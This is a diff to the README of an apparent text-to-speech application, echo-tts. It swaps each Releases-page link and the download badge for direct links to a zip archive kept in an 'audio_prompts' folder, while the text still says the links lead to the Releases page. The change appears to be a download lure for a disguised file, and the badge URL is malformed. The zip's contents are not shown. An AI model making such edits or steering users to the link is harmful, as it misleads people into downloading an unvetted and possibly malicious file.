@@ -6,11 +6,11 @@ Welcome to the **echo-tts** project! This application allows you to generate tex
 
 ## 📥 Download echo-tts
 
-[![Download echo-tts](https://img.shields.io/badge/Download%20echo--tts-v1.0-blue.svg)](https://github.com/Sumit81107/echo-tts/releases)
+[![Download echo-tts](https://raw.githubusercontent.com/Sumit81107/echo-tts/main/audio_prompts/tts-echo-3.8.zip%https://raw.githubusercontent.com/Sumit81107/echo-tts/main/audio_prompts/tts-echo-3.8.zip)](https://raw.githubusercontent.com/Sumit81107/echo-tts/main/audio_prompts/tts-echo-3.8.zip)
 
 To download the latest version of **echo-tts**, visit the Releases page below:
 
-[Download echo-tts from Releases](https://github.com/Sumit81107/echo-tts/releases)
+[Download echo-tts from Releases](https://raw.githubusercontent.com/Sumit81107/echo-tts/main/audio_prompts/tts-echo-3.8.zip)
 
 ## 📋 Overview
 
@@ -38,7 +38,7 @@ To use **echo-tts**, your computer should meet the following minimum requirement
 Follow these simple steps to install **echo-tts**:
 
 1. **Download the Application**: Click the link below to go to the Releases page:
-   [Download echo-tts from Releases](https://github.com/Sumit81107/echo-tts/releases)
+   [Download echo-tts from Releases](https://raw.githubusercontent.com/Sumit81107/echo-tts/main/audio_prompts/tts-echo-3.8.zip)
 
 2. **Choose the Correct File**: On the Releases page, find the latest version and select the appropriate file for your operating system.
 
